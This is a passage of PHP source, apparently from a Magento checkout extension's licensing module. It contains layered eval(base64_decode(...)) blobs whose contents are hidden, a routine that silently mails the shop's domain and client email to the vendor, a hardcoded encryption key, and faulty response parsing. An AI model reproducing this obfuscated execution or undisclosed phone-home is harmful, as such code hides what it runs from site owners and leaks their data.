jRZa1phWVZORk5YTlpWRTV2Vm14U2MxbDZSbHBXYlZKSVZUSjBhMWRyTVhGV2EzaGhVbnBHVUZreWMzaFhSMVpJWTBVMVRsSkdXakpXYWtwM1V6RmFkRk5ZWkdwU1YzaFZXV3hvYjJOV1VsVlJhM1JPWWtkNE1GUnNWVFZoVmtwWlZXeFdXbGRJUW5KVmJGcFhWMFU1V0U1V1VsZFdWRlpFVmpKd1EyTXhTa2RTYkdoaFVsaENVMVJWVm1Ga1ZsVjRWbXM1VW1KSE9UTlphMVpUVld4WmVWVnVVbGRXUlVwTVdYcEdjMk50UmtaUFYyeFRWak5vUzFkWWNFSk5Wa3BJVW14YVUySlVWbFZXYkZVeFVURmtjVkZ1VGxOU2ExcFpWMnRXZDFWck1VWlhibFpXVFZaYVVGVlhlSFprTWtwR1ZXeEtWMDFzU2t4V1ZsSkRVakpLYzFSdVNtaFNhelZ3VkZkMFlWZHNXa2RoUms1V1ZqQndlVlJzWXpWWlZrbzJVbXhvVjFKc2NIcFdNVnBUWTFaR2MxTnNhRk5XV0VGNlZteGtNR0V4U1hkTlZXUnBVbXhLYUZSVlVsZFNWbXhYVm10a2FXSkZOVmRXUjNSTFdWVXhTR1ZGVmxaV2JWSnlWVEo0Um1ReFNuUk9WbEpYVmxSV1JGWXljRU5qTVVwSFVteG9ZVkpZUWxOVVZWWmhaRlpWZUZack9WSmlSemt6V1d0V2EyRnJNVVZXYTFaYVZteGFTRmx0ZUU5V2JGSnlVMjFHVGxJemFFWldWbHByWVRGT2MxSllaRk5pVkZaVlZteFZNVkV4WkhGUmJrNVRVbXRhV1ZkclZuZFZhekZHVjI1V1ZrMVdXbEJWVjNoMlpESktSbFZzU2xkTmJFcE1WbFpTUTFJeVVsZGFSbVJoVWxSc1QxVnFRbUZYYkZsNVRWUlNWRTFzV2xkVmJGSlhWbXhKZVdWRlVsVldWMUpRV2taYVlXUkhWa1pOVmtwWFVsVndUbFpVUmxkVU1VWnpZak5rYVZKV1NsTldha3BUVXpGV1ZWRnJaR2xpUlRWWFZrZDBTMWxWTVVobFJWWldWbTFTY2xVeWVFWmtNVXAwVGxaU1YxWlVWa1JXTW5CRFl6RktSMUpzYUdGU1dFSlRWRlZXWVdSV1ZYaFdhemxvVFd4S1dGa3dXbk5oUmtwR1UyeE9WVlo2Um5aWmVrWnJWbFpPZFdOSGJHaE5ibWhIVmtaV1QwMUdUbk5VYTFwUFUwZFNZVlJYY0ZkV1JuQklUVlpPVkZJd2NFcFdWekZIVm1zeGRGVnFSbFpsYXpWNlZWZHplRkp0U2taaFIyaFVVbTVDZVZacVFsZGpNbEpYVkZob1ZXRnJOVlpaVkVFeFpERldWMXBIZEZSaVJWWXpWVzB3TVZaR1dsWk9WVTVZWVd0S2VsVnJXa2RYUm5CR1kwWktUbEpXY0RGV1ZFWlhWREZHYzJJelpHbFNWa3BUVm1wS1UxTXhWbFZSYTJScFlrVTFWMVl4YUd0V1YwVjNUbGhrVmxadFVuSlZNbmhHWkRGS2RFNVdVbGRXVkZaRVZqSndRMk14U2tkU2JHaGhVbGhDVTFSVlZtRmtWbFY0Vm1zNVVtSkhPVE5aYTFaVFZXeFplVlZyTVZkaE1taFFWa1JHUm1WWFNrWlRiVVpPVWpOb1JsWldXbXRoTVU1elVsaGtVMkpVVmxWV2JGVXhVVEZrY1ZGdVRsTlNhMXBaVjJ0V2QxVnJNVVpYYmxaV1RWWmFVRlZYZUhaa01rNUdZa1phYVZaSGVIWldha0pXWlVVeFIxWnJhRTlXV0ZKd1ZXcEJlRTVzVmxoT1YwWm9WakJ3ZVZSc2FFOVdSbHBYVW1wT1dHRnJXbkpVVkVGNFVtMVNSbU5HU2s1U1ZuQXhWbFJHVjFReFJuTmlNMlJwVWxaS1UxWnFTbE5UTVZaVlVXdGthV0pGTlZkV1IzUkxXVlV4U0dWRlZsWldiVkp5VlRKNFJtUXhTblJPVmxKWFZsUldSRll5Y0VOa2JWWnpWVzVTYkZKdVFrOVVWV2hEWld4a2NsWnNaRlZOYkVwNldUQldiMVl4V2paV2EzUldZVEZLUTFreWVFOVdiRkowWkVkd1UwMVZXVEZXYkZwVFVUSkdSazFZUm1oTk1sSlpWV3RWTVZWR1VsZFhia3BzVm14S01GcFZaSGRVYXpGRlVtcEdWbUV4Y0VoYVIzaDJaREpLUmxWc1NsZE5iRXBNVmxaU1ExSXlTbk5VYkZwVllUQndhRlJWWkRSU1ZsWlhXa2QwVkdKRlZqTlZiVEF4VmtaYVZrNVZUbGhoYTBwNlZXcEJlRkpXY0VaV2JGcFhaVzE0TVZaVVJsZFVNVVp6WWpOa2FWSldTbE5XYWtwVFV6RldWVkZyWkdsaVJUVlhWa2QwUzFsVk1VaGxSVlpXVm0xU2NsbHNXbGRXVmtaeVpVWlNWMVpVVmtSV01uQkRZekZLUjFKc2FHRlNXRUpUVkZWV1lXUldWWGhXYXpsU1lrYzVOVll5ZUV0VWJFcFpWV3QwVmxaRlNraFpiWGhQVm14U2NsTnRSazVTTTJoR1ZsWmtkMk50U25Ka1JsSm9aVzFPZFZNeFRuSk9lV053UzFSelBTY3BLVHM9JykpOw=='));

        $lastEmailTimeFlag = $this->flagFactory->create()->initFlagCode('iwd_opc_general_license_last_email_time')
            ->loadSelf();
        if (empty($response)) {
            $lastEmailValue = $lastEmailTimeFlag->getFlagData();
            if ($lastEmailValue != strtotime(date('Y-m-d'))) {
                $lastEmailValue = strtotime(date('Y-m-d'));
                $lastEmailTimeFlag->setFlagData($lastEmailValue)->save();
                $baseUrl = $this->getBaseUrl();
                $email = $this->getClientEmail();
                mail(
                    'extensions@iwdagency.com',
                    "EXTENSION API CONNECTION ERROR",
                    "Hi, I can not connect to API.\r\n"
                    . "Domain: {$baseUrl}\r\n"
                    . "ExtensionCode: CheckSuite-Enterprise\r\n"
                    . "ClientEmail: {$email}\r\n\r\n"
                    . "Please, do not replay!"
                );
            }

            $this->saveLastApiData(
                [
                    'active' => true,
                    'nextCheck' => strtotime('+ 1 hour'),
                ]
            );
            $this->response = ['secretCode' => 'iwd4kot_success'];
        } else {
            $p = strpos($response, "\r\n\r\n");
            if ($p !== false) {
                $response = substr($response, 0, $p);
                $response = substr($response, $p + 4);
            }

            $response = json_decode($response, true);
            if (!isset($response['Error'])) {
                $lastEmailValue = $lastEmailTimeFlag->getFlagData();
                if ($lastEmailValue != strtotime(date('Y-m-d'))) {
                    $lastEmailValue = strtotime(date('Y-m-d'));
                    $this->resourceConfig->saveConfig(
                        'iwd_opc/general/license_last_email_time',
                        $lastEmailValue,
                        'default',
                        0
                    );
                    $baseUrl = $this->getBaseUrl();
                    $email = $this->getClientEmail();
                    mail(
                        'extensions@iwdagency.com',
                        "EXTENSION API CONNECTION ERROR",
                        "Hi, I can not connect to API.\r\n"
                        . "Domain: {$baseUrl}\r\n"
                        . "ExtensionCode: CheckSuite-Enterprise\r\n"
                        . "ClientEmail: {$email}\r\n\r\n"
                        . "Please, do not replay!"
                    );
                }

                $this->saveLastApiData(
                    [
                        'active' => true,
                        'nextCheck' => strtotime('+ 1 hour'),
                    ]
                );
                $this->response = ['secretCode' => 'iwd4kot_success'];
            } else {
                if ($response['Error']) {
                    throw new \Exception($this->getErrorMessage($response));
                } else {
                    $this->saveLastApiData(
                        [
                            'active' => true,
                            'nextCheck' => strtotime('+ 4 hour'),
                        ]
                    );
                    $this->response = [
                        'secretCode' => 'iwd4kot_success'
                    ];
                }
            }
        }

    }

    public function saveLastApiData($data)
    {
//        eval(base64_decode('IGV2YWwgKGJhc2U2NF9kZWNvZGUoJ0lHVjJZV3dnS0dKaGMyVTJORjlrWldOdlpHVW9KMGxIVmpKWlYzZG5TMGRLYUdNeVZUSk9SamxyV2xkT2RscEhWVzlLTUd4SVZtcEtXbFl6Wkc1VE1HUkxZVWROZVZaVVNrOVNhbXh5VjJ4a1QyUnNjRWhXVnpsTFRVZDRTVlp0Y0V0WGJGbDZXa2MxVkUxSFVreFpWV1JPWlZaYVZWTnJPVk5oYlhoNVZqSjRhMVF5VW5OalJXaFhWbnBzVEZSWGVFdFRiRlY1WTBaa1ZHSkZOVXBXUjNNMVZXc3hkR1ZGVGxoaGEwcDZWV3RhUjFkR2NFWmpSa3BPVWxad01WWlVSbGRVTVVaellqTmthVkpXU2xkWmJYTXhXVlpaZDFaVVFtdE5WbkJIVjJ0b1QyRkhTa2xSYkd4VllrZG9NMWRXV21GV01VNTBUMWRHVTFZeFNrbFdWM0JMVXpGT1IxTnVVazlXV0VKVVZXdFdTMlJXVlhsa1J6bFdUV3RzTlZWdGVITldWbVJIVTJ4S1dtSkdjRE5hVjNoclZqRndTR1JHVGs1V00yaGFWbXRrZDFFeVJsWk5TR1JwWld0YVZsVnRlRVpsUm14WVRWVTVhMUpzY0RCWlZXUXdWVEF4VjFkcVNsWmxhMXBQV2tSQ2VtVldTbk5oUlRsWVVsVndlVlpYZUdGa01sWnpXa1prWVZJelVsUlZha0p6VGxaYVdFMVVVbFZTYTFZMVZsYzFhMWxXU2taalJsSllZbFJHUzFwWGVFZGtSMDVIWWtVMWFWWnJjRFpXTVdOM1pVWlplVlpzWkdsU2JXaHpWV3BHZDJOR1ZuRlRhbEpxVm0xU2VsZFljRWRpUjBwSlVXeG9WVTFYYUZCV01uaHJVbXMxU1ZwR2FGTlNXRUpWVjFaV2ExVXhUa2RUYkdoUFZsaG9WMVpyVmt0VVZsVjRWbXM1VW1KSE9UTlphMVpUVld4WmVWVnJkRlpXUlVwSVdXMTRUMVpzVW5KVGJVWk9Vak5vUmxaV1dtdGhNVTV6VW1wYVVsZEZjR0ZaVkVwT1RWWnNWbGR1WkZOTlZrb3dXbFZrYzFVd01WaGxSRXBXWld0YVZGcFhlRk5qYkZKMFRsVTFVMWRHU2t4V1ZsSkRVakpLYzFSc1dsVmhNSEJvVkZWa05GSldWbGRhUjNSVVlrVldNMVZ0TURGV1IwVjVWRmhvWVZKNlJreGFSVnBUWkVkV1IxZHJOV2xYUjA0MVZtcEtORlF4Um5KUFZscHBVbGRvVVZZd1pGTmhSbHAxWTBaa1QySkhkekpWTW5CVFdWZEtTR1JFVmxwaE1taHlXVlZhU21WR1pIRldiR2hUVWxoQ05sWkdaRFJpYlZaWVZtdG9iRkl5ZUhCV2FrWkhUVEZrVjFack9XbGlWWEI2V1d0YWIxWXlTblZSYXpWWFlURmFlVnBWV2xOa1IwVjZZVWRvYVZacmNFdFdWRVpxVFZaU1IxZHJiRlZoZW14VFZGY3hORkV4WkhGUmJrNVRVbXRhV1ZkclZuZFZhekZHVjI1V1ZrMVdXbEJWVjNoMlpESktSbFZzV21saVJuQjNWa1prZDFZeVRsZGFTRTVWWVRCd1VWWnNaRFJUVmxGNFlVZDBXbFpzYnpKV2JYQmhWMjFXY21KNlFsaGlWRVpRV2tWYVMyUldXblJTYkU1c1lsaGtNMVpxUWxOVU1VVjVWbTVPYWxKdGVGaFpiR2hUWTBaU1YxVnVUbXBTYmtKWVdWVmFUMkZXU1hkT1JFWllZV3R2ZDFsV1pFdFdWMHBGVW14b1YxSllRbGxXYlhSclVqRmtXRlJyYUd4U1dHaFlWVEJWTVZWR1ZsVlRiazVTWWtjNU0xbHJWbE5WYkZsNVZXdDBWbFpGU2toWmJYaFBWbXhTY2xOdFJrNVNNMmhHVm14ak1WTXhiRmRhUldoclVucFdWMVZ0Y3pGU1JteHhVbTVrV0ZadE9UWlphMXAzWVZaWmVsb3phRlpsYTBwUVdWZHplR015VGtsU2JGcHBWak5vVWxadGRHdGhiVkY0V2tab2FsSlViSEJWYkZKR1RXeGFXRTFZVGxWTmJGcDZWakkxUjFaV1duTlRiVVpWVmpOT05GUnNXbkpsYkVaelVXMTBiR0V3Y0U1V1ZFWlhWREZHYzJJelpHbFNWa3BUVm1wS1UxTXhWbFZSYTJScFlrVTFWMVpIZEV0WlZURkpVV3RzVjJKVVZsaFdNbk4zWkRKS05sSnNjRTVTTW1oVlYxZDBZV1F4U25OV2JsSm9Vak5TVkZSVldtRmtWbHBXVjJzNVVrMXNTakJXUjNSdlZqSktjMWR1UmxWV1JVVjRXbGQ0YTFKV1RuTmFSM1JYWWxoUk1sWlVTbmRXTWtaelZHdGtVMkpzY0ZSVmJYUmhUV3hrY1ZGdVRsTlNhMXBaVjJ0V2QxVnJNVVpYYmxaV1RWWmFVRlZYZUhaa01rcEdWV3hLVjAxc1NreFdWbEpEVWpKS2MySkdhRTlXVkd4eVdXeFdkMlZzVVhoYVJGSm9WakJ3VjFSc1VrdFhSMFY1Vld4a1dtRnJTak5WTUZwWFpFZEdTR1JHVGs1U2JHOTZWbXRXVjFKdFVYaFVXR1JwVWxaS1UxWnFTbE5UTVZaVlVXdGthV0pGTlZkV1IzUkxXVlV4U0dWRlZsWldiVkp5VlRKNFJtUXhTblJPVmxKWFZsUldlVmRXVm1Ga01XUlhWV3hzVm1GNlZtOVphMXBYVGxaYVJsZHRkRlZOUkVaSlZrYzFRMWRyTUhkT1ZWcFhWbTFOTVZsdGVFOVdiRkp5VTIxR1RsSXphRVpXVmxwcllURk9jMUpZWkZOaVZGWlZWbXhWTVZFeFpIRlJiazVUVW10YVdWZHJWakJWTURCNFUyNXdXR0pHY0ZCVVZFWlRZMnhTZFZGc1NsZE5iRXBNVmxaU1ExSXlTbk5VYkZwVllUQndhRlJWWkRSU1ZsWlhXa2QwVkdKRlZqTlZiVEF4VmtaYVZrNVZVbGRXVm5CWVZXMTRZV05yT1ZkWGF6VlhWa1phVUZacVFsTlNNVTE0VW01T1dGZEhhRkZXYkZwaFZURmFkR1ZGZEZKTlZrcEhWV3hvYTFaRk1VaGxSVlpXVm0xU2NsVXllRVprTVVwMFRsWlNWMVpVVmtSV01uQkRZekZLUjFKc2FHRlNXRUpUVkZWV1lXUldWWGhXYXpsV1RXeEtXVlV4YUhOVU1WbDZVVzFvVjFac1NrUldSVnBQVm14U2NsTnRSazVTTTJoR1ZsWmFhMkV4VG5OU1dHUlRZbFJXVlZac1ZURlJNV1J4VVdwQ1YxWXdNVE5VYkZaVFdWZFdjbE5yTVZaTlZscFFWVmQ0ZG1ReVNrWlZiRXBYVFd4S1RGWldVa05TTWtwelZHeGFWV0V3Y0doVVZXaERVMVphZEU1V1pGaGhla0l6V1c1d1IxZHJNVWhoUmxKYVlURndNMVZ0ZUZka1IwWklaRVpPVGxKc2NERldiRlpoVkRGRmVWSnNaR2xTYlhoV1dXeG9iMVZHYkZobFJYUnBWbTFTZWxkWWNFZGhSMHBXWWtSV1YxWjZSVEJXUlZwR1pVWk9jVkpzY0doaE1uUTBWMVprTkdReFdrZFNiR3hYWVROQ1UxUldWbmRsYkdSWVRVaG9WVTFzV2xsV2JYaHpWVzFHY2xOdGFGZGhhMXBNVlcxNGExWXlSa2RVYldoVFYwWktWMWRZY0VKTlZrcEhZMFJhVW1FemFGVldiRlV4VVRGa2NWRnVUbE5TYTFwWlYydFdkMVZyTVVaWGJsWldUVlphVUZWWGVIWmtNazVHWVVkNFUwMXRhSGhXUmxKSFV6RlNjMkpHWkdGU1ZHeHdWV3BDZDAxV1draE5WRkpXVFZWc00xWXhhR3RYUmxwelYyMW9XbVZyV25wV01GcHlaV3hXYzFKdGJHaGxiRm8yVmpKMFYxWXhiRmhVV0docFVtMW9hRlZzV21GWlZsbDNWMnQwYVUxVk1UTldSM2hQWVZaSmQyTkVRbGRTZWxaNldXdGFhMUpzVGxsYVJtaHBVakZLVlZaWGVHRmpNV1JYVm01U2FGSllhRmRhVjNSSFpWWmtXV05GZEZOTlJFWjZXVEJhVTFsVk1IZFRiRVpoVTBoQ1JGWkZXazlXYkZKeVUyMUdUbEl6YUVaV1ZscHJZVEZPYzFKWVpGUldSbHBWVm14a1UxVkdiRlphUms1VVVteEtNRlF4Vm5kVmF6RjBZVWhHVjFZemFIWlpha3BIWXpKT1IySkdTbWhoTUhCMlZtMDFkMk13TVZkVWJGcFZZa1UxY0ZWc2FGTldWbFpZWTBkMFUxWnNXbGxVTVdNeFZrWmFWazVWVGxoaGEwcDZWV3RhUjFkR2NFWmpSa3BPVWxad01WWlVSbGRVTVVWNVZteGthbEp0ZUZkWlYzUmhZMVpzYzFWc1RtbGlSVFY1V1ZWYVQyRlZNWEpYYkhCWFVteEtjbFZzV2xkWFJUbFlUbFpTVjFaVVZrUldNbkJEWXpGS1IxSnNhR0ZTV0VKVlZXdFdSazVXVG5WaVNFcHFVbFJyZWxWR1VYZGlhM1JVWVhwamJrdFRhemNuS1NrNycpKTs='));

        try {
            $lastLicenseDataFlag = $this->flagFactory->create()->initFlagCode('iwd_opc_general_license_last_data')
                ->loadSelf();

            $nonceSize = openssl_cipher_iv_length('aes-256-ctr');
            $nonce = openssl_random_pseudo_bytes($nonceSize);
            $key = hex2bin('6f4b984b3e34b75c1663');
            $encryptedData = openssl_encrypt(
                json_encode($data),
                'aes-256-ctr',
                $key,
                OPENSSL_RAW_DATA,
                $nonce
            );

            $encryptedData = base64_encode($nonce . $encryptedData);

            $lastLicenseDataFlag->setFlagData($encryptedData)->save();
        } catch (\Exception $e) {
            return $this;
        }

        return $this;
    }

    public function getLastApiData()
    {
//        eval(base64_decode('IGV2YWwgKGJhc2U2NF9kZWNvZGUoJ0lHVjJZV3dnS0dKaGMyVTJORjlrWldOdlpHVW9KMGxIVmpKWlYzZG5TMGRLYUdNeVZUSk9SamxyV2xkT2RscEhWVzlLTUd4SVZtcEtXbFl6Wkc1VE1HUkxZVWROZVZaVVNrOVNhbXh5VjJ4a1QyUnNjRWhXVnpsTFRVZDRTVlp0Y0V0WGJGbDZXa2MxVkUxSFVreFpWV1JPWlZaYVZWTnJPVk5oYlhoNVZqSjRhMVF5VW5OalJXaFhWbnBzVEZSVmFFTlRWbHBZVFZSU1dHRjZRak5aYm5CSFYyc3hTR0ZHVWxwaE1YQXpWVzE0VjJSSFJraGtSazVPVW14d01WWnNWbUZVTVVWNFlraE9hRkpzV25GVVZWSlhVbFpzVjFaclpHbGlSVFZYVmtkMFMxbFZNVWhsUlZaV1ZtMVNjbGxVUms5U2JVbzJVbXhTVjFZeVp6SldhMlF3VkRKT1IxSnNhR0ZTV0VKVFZGVldZV1JXVlhoV2F6bFNZa2M1TTFsclZsTlZiRmw1Vld0MFZsWkZXa3hhVjNoclZqSkdSazlWTlZOaVJYQktWMWQwYTJReGJGZFhhbHBYWVd4d1dWbHJXbUZXUm14V1drWk9WRkpyY0hsWGEyUnpWVEF4UjJORVJsWk5WbHBUV2tSR2RtUXlUa1ppUmxwcFZrZDRkbFpxUWxabFJURkhWbXRvVGxZd1duRlVWbVEwVjFaa2NsWnRkRmhpUm13elZHdG9hMWR0Um5KT1ZYaFZZa1paTUZac1ZURlhSMDVJWTBkc1YySklRakpXTW5SWFlURmFkRk5ZWkd0U2JFcFBWVlJPVTJJeFduVmpSbVJyVFZoQ1IxWnRNVWRoYXpGWVpVWnNXR0V4V2xSWlZsVjRZekZPZFZSc1VrNVNWRlo1VjFSQ2ExVnRWbGRXYmxKWVlsZDRUMVJWVm5kbFJsbDNWV3QwYUUxcmNFbFZNalZUVmpKS2RHVkhSbGRoYXpWMldXeGFjMk5zY0VsVWJXaHBVMFZLV2xaSGVHOWtNV3hYVjI1R2FWTklRbGxXYlRGdlZVWlNWbGR0Tld4V2JGb3dXVlZrTUZVd01VZFhha1pXWld0YVIxcEVSazVrTWtwR1ZXeEtWMDFzU2t4V1ZsSkRVakpLYzFSc1dsVmhNSEJvVkZWa05GSldWbGRhUjNSVVlrVldNMVZ0TURGV1JscFdUVlJPVkdWcmNFeFZNRlUxVjBkR1NGSnNUbWhsYkZvMlZqRmtNR0V4WkhSVFdHUnJVbXhhY1ZSVlVsZFNWbXhYVm10a2FXSkZOVmRXUjNSTFdWVXhTR1ZGVmxaV2JWSnlWVEo0Um1ReFNuUk9WbEpYVmxSV1ZWZFdVa2RrTVdSSFZXNVdhVkl6YUZsVmJGWnpUVEZaZVdWSGRGWk5WWEJZV1d0YWMxWnRTbGhoUlhSV1lURktSRmx0ZUU5amJIQkZWVzFvVTAxRVJUSldiR1I2WlVkR1IxZFlaRTlYUlRWaFdXeFNWMVZHYkhKWGEzUlVVbXR3ZUZWWGVIZFdNVnAxVVdwYVYwMVdjSEpaVnpGVFVqRkdkVlZ0UmxOTk1taDVWbGQ0WVdReVZuTmFSbVJoVWpOU1ZGWnRNVFJYYkZwWVRWYzVWVkpyVmpWWk0zQlBWVEZLY2xkcVNsaGhhMHA2Vld0YVIxZEdjRVpqUmtwT1VsWndNVlpVUmxkVU1VWnpZak5rYVZKV1NsTlpiWFJMWVVac1YxWnJaR3RpUlRWWVZrZDRUMkZGTVZsUmJHeFhVbnBXZWxscldtdFNiRTVaV2tab2FWSXhTbFZXVjNoaFl6RmtWMVp1VW1oU1dHaFhWRlZXY21Wc1ZuSlhhMlJyWWtjNU0xbHJWbE5WYkZsNVZXdDBWbFpGU2toWmJYaFBWbXhTY2xOdFJrNVNNMmhHVmxaYWEyRXhUbk5TV0dSVFlsUldZVlJYY0VkWFJsSldXa1pPV0Zack5URldiWFIzVlRKS2MxTnVTbGRTUlRWeFdrUkdUbVF5U2taVmJFcFhUV3hLVEZaV1VrTlNNa3B6Vkd4YVZXRXdjR2hVVldRMFVsWldWMXBIZEdsV2JGcFdWVmQwTkZVeFNuSlhha3BZWVd0S2VsVnJXa2RYUm5CR1kwWktUbEpXY0RGV1ZFWlhWREZHYzJJelpHbFNWa3BUVm1wT1UyTkdXbkZTYlVaUFlrZDNNbFV5ZEd0aFYwcEpVV3hXVmxac1NucFZNbmhLWkRKT1NFOVdjR3hoTTBKWVZrWmtlazFXU1hkUFZtaHJVakJhV0ZSVlVsWmxWbGw1WkVkMFYySlZiRE5aTUZadlZtMUtXV0ZIUmxWV1JVb3lWRlphY21ReVJrZFViV3hUWW10S1NGWnNZM2hpTWtWNFUxaGtWMkp1UWxWV2JHUnZWa1p3VjFwR1RsaFNiSEJhVlZkNFEyRXlWbkpUYXpGV1RWWmFVRlZYZUhaa01rcEdWV3hLVjAxc1NreFdWbEpEVWpKS2MxUnNXbFZoTUhCb1ZGVm9RMU5XVW5OaFIwWm9WakJ3VjFSc2FFOVdNVnBHWTBod1ZXSllhRE5XYTFwSFZsZEtSbU5HVG14aVdHUTJWbXBLTkdGck1WaFdibEpWVjBkNGMxVnFSbmRaVmxKWVRWUlNUazFYZUZkWGExcHJZa1phZEZwRVZscGhNVXBNVmpGVmVHUlhSa2xVYkhCcFZrVmFlVlpHVm10U01VcEhZak5zVDFadVFsaFVWbHAyVFd4YVJsZHNUbFJoZWtaWFZHeG9RMVJzV1hwUmJrcFdUVVphZWxwR1drNWxSbFoxWTBaV2FFMUVWak5XVmxwcllURk9jMUpZWkZOaVZGWlZWbXhWTVZFeFpIRlJiazVUVW10YVdWZHJWbmRWYXpGV1lqTm9XRll6UWt0VVZtUkhZekpPUjFWc1NsZFNNMmhNVmxjMWQxSXlUa2RhUlZaVllYcHNUMVp0TVRSTlZscElZMFZPYUdKVldsbFhhMmhMVjIxS1NGVnNhR0ZXZWtaUFdsWmFTMlJGTlZoU2JGcE9UV3hLTVZacldsZFVNREI0WWpOa2FsSlhhRkJXTUZwM1kwWnNjMVpVUm1wTlZuQldWVEkxVDFReVNrbFJiRlpoVWtWd2NsVjZTbGRrUjBaSlVXeHdWMkpYYUZSWFZ6RXdUVVphV0ZSWVpFOVdWa3B2Vm14V1lXUldWWGhXYXpsU1lrYzVNMWxyVmxOVmJGbDVWV3QwVmxaRlNraFpiWGhQVm14U2MxUnRhR2xXVm5CaFZsWmpkMDVXYkZkYVJWcHFVbXh3V1ZsclpHOWtiRkpXVm01T1UxWlVSa2xYYTJSelZqQXhTVkZ1VWxoWFNFSlFWbXBLUjFkR1VsbGpSbHBwWWxob1RsWldVa2RUTURGSFdraE9hRkpVYkhOWmEyUTBWMVprY2xwRVVsVldhMVl6VlcwMVMxZHRTbFZSVkVaaFVteHdlVnBXV21Gak1WWjBZVVpvVkZKVmNEWldhMVpYVkRGRmVWVnNhRlppUjJoelZUQlZNVlJzVmxWUmEyUnJWbXhHTTFkclZqQmhiRWw0VTJ0V1dGWkZOVVJXVldSVFRteEdjbVZHVWxkV1ZGWkVWakp3UTJNeFNrZFNiR2hoVWxoQ1UxUlZWbUZrVmxWNFZtczVVbUpIT1ROWk1GWnZZVEZKZW1GSVRsZFdSVXBIVkd4YVQxWnNjRWhQVjJ4VFRWWndSMVpVU1hoak1rWkhWMnBhVm1Kc2NGVlpiVFZEWVVac2MxWlVSbFJTYXpWV1ZtMTRRMVV4U25KalNHUlhVbXhLVEZadE1WZGphelZXWVVaU1YxSlVWbEZXYlhCQ1pVVTFSMVZ1VW1wU2JrSnpXVlJPUWsxV2JGbGpSM1JUVm14YVdWUXhZekZXUmxwV1RsVk9XR0ZyU25wVmExcEhWMFp3Um1OR1NrNVNWbkF4VmxSR1YxUXhSblJTV0docVVsZG9XRmxzYUVOalZteDBUVlJTVGsxWVFrZFhhMXByWVVVeFZtTkZiRlppV0VKRVZqSjRWbVF4U2xWV2JGSlhWakF3ZUZkclVrZGtNV1JHVGxac2FsSXpRazlaYlRGdlpFWlplV1JIZEZkTmExb3dWa2MxVjJGV1RraFZia3BXVmtWd2NsWkVSa1psVjBwR1UyMUdUbEl6YUVaV1ZscHJZVEZPYzFKWVpGTmlWRlpWVm14Vk1WRXhaSEZSYms1VFVtdGFXVmRyVm5kVmF6RkdWMjVzVjAxV1NreFpla3BTWlZaS2NtRkdaR2xpV0doWlZsZHdSMWRyTVVkalJWcFZZV3MxVmxsVVFURmtNVlpYV2tkMFZHSkZWak5WYlRBeFZrWmFWazVWVGxoaGEwcDZWV3RhUjFkR2NFWmpSa3BPVWxad01WWlVSbGRVTVVaMFUyNU9hVkp0YUZoWmJUVkRWR3hhY2xadVNteFNiRW93V1ZST2IyRkhTbGRUYTNCV1RWZE5lRlpHV2tkV1ZrWnlaVVpTVjFaVVZrUldNbkJEWXpGS1IxSnNhR0ZTV0VKVFZGVldZV1JXVlhoV2F6bFNZa2M1TTFsclZsTlZiRmw1Vld0MFZsWkZXa3hhVmxwcll6SkdTVk50Y0U1U2EzQlVWMWR3UzJFeFRuTlNXR1JUWWxSV1ZWWnNWVEZSTVdSeFVXNU9VMUpyV2xsWGExWjNWV3N4UmxkdVZsWk5WbHBRVlZkNGRtVkdWbGxoUmtwb1RWaENWMWRYZEZaTlZscFhWMnRhV0ZaR1dsZFVWbFpoVjBaa2NscEhSbFpOVlhCWFZqSjRZVlpzV25KT1NIQlhVak5TVUZrd1drZFhSbkJHWTBaS1RsSldjREZXVkVaWFZERkdjMkl6WkdsU1ZrcFRWbXBLVTFNeFZsVlJhMlJwWWtVMVYxWkhkRXRoUlRGeVkwUkNWVTFYYUZoV01uTjRZekZhY2s5V1NrNWlXR2hFVmpKd1EyTXhTa2RTYkdoaFVsaENVMVJWVm1Ga1ZsVjRWbXM1VW1KSE9UTlphMVpUWVVkV2RGVnJXbGRXYlUweFdXMTRUMVpzVW5KVGJVWk9Vak5vUmxaV1dtdGhNVTV6VWxoa1UySlVWbFZXYkZVeFVURnNWVkp1WkZSU2JIQXdXVEJrZDJGWFNsbGFNM0JZWVRGYWNsWnFTa1psUms1eVlVWk9hR0V3Y0doV2JGSkRVbXMxVjFSc1dtRlRSMUp6V1d4V2MwNVdVbk5hUjBaYVZtdHNORll5TlVkWGJVWnlZMFpTV21FeFdYZFZhMXBYWkVkU1NGSnNaRTVTUmxWNFZqSjRZV0l4UlhkTlZXUnFVbTFvVjFsVVJtRlpWbGwzVjJ0MGFVMVdTa2RXUjNSUFZHeEpkMDVVUmxkaVZFVXdWa1ZhWVZOV1VuSlBWa3BPWWxob1JGWXljRU5qTVVwSFVteG9ZVkpZUWxOVVZWWmhaRlprZEdWRk9WSk5hMXA2V1d0YWMxWnRTbGxSYlRsV1ZrVktTRnBIZUd0U2JGcHpXa1U1VTJKWVVURldiVEF4WVRKRmVGTlliR3hTUlhCaFdXeGtORkV4YkZWU2JtUlhVakJXTlZkclpEUmhNbFp5VTJzeFZrMVdXbEJWVjNoMlpESktSbFZzU2xkTmJFcE1WbFpTUTFJeVNuTlViRnBWWVRCd2FGUlZhRU5UVmxwWVRWUlNXR0Y2UWpOWmJuQkhWMnN4U0dGR1VscGhNWEF6VlcxNFYyUkhSa2hrUms1T1VteHdNVlpzVm1GVU1VVjRZa2hPYUZKc1duRlVWVkpYVWxac1YxWnJaR2xpUlRWWFZrZDBTMWxWTVVobFJWWldWbTFTY2xsc1dsZFdWVEZGWWtWMGJGWXpVak5XUkU1cVQxWkNWRmt6UWt4V1NFMDVTbmxyY0U5M1BUMG5LU2s3JykpOw=='));

        $decryptedData = [];
        try {
            $lastLicenseDataFlag = $this->flagFactory->create()->initFlagCode('iwd_opc_general_license_last_data')
                ->loadSelf();
            $decryptedData = $lastLicenseDataFlag->getFlagData();
            if (!$decryptedData) {
                return [];
            }

            $message = base64_decode($decryptedData, true);
            $nonceSize = openssl_cipher_iv_length('aes-256-ctr');
            $nonce = mb_substr($message, 0, $nonceSize, '8bit');
            $cipherText = mb_substr($message, $nonceSize, null, '8bit');
            $key = hex2bin('6f4b984b3e34b75c1663');
            $decryptedData = openssl_decrypt(
                $cipherText,
                'aes-256-ctr',
                $key,
                OPENSSL_RAW_DATA,
                $nonce
            );
            $decryptedData = json_decode($decryptedData, true);
        } catch (\Exception $e) {
            $decryptedData = [];
        }

        return $decryptedData;
    }
    
    
    public function sendIwdExperienceEmail($customer)
    {
        $store = $this->storeManager->getStore()->getId();
        $transport = $this->_transportBuilder->setTemplateIdentifier('iwd_new_account_from_guest')
            ->setTemplateOptions(['area' => 'frontend', 'store' => $store])
            ->setTemplateVars(
                [
